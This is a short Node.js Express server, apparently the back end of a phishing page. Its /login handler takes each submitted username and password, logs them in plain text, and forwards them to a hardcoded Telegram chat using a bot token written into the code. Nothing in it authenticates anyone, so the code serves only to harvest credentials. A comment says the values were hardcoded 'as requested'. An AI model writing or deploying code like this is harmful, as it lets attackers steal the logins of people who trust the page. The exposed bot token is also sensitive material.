const express = require("express");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");
const app = express();

// Telegram bot credentials (hardcoded as requested; use environment variables in production)
const TELEGRAM_BOT_TOKEN = "7709941137:AAF8zjnw0zcyKeUGZp4XTbxq7qM3HUii0Ko";
const TELEGRAM_CHAT_ID = "8055889698";

// Initialize Telegram bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Middleware to parse form and JSON data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from public directory
app.use(express.static(path.join(__dirname, "public")));

// Handle POST request for form submission
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  console.log("Received login data:", { username, password });

  // Send data to Telegram
  const message = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;
  bot.sendMessage(TELEGRAM_CHAT_ID, message)
    .then(() => {
      console.log("Message sent to Telegram");
      res.send("Login data sent to Telegram!");
    })
    .catch((error) => {
      console.error("Error sending to Telegram:", error.message);
      res.status(500).send("Error sending data to Telegram");
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
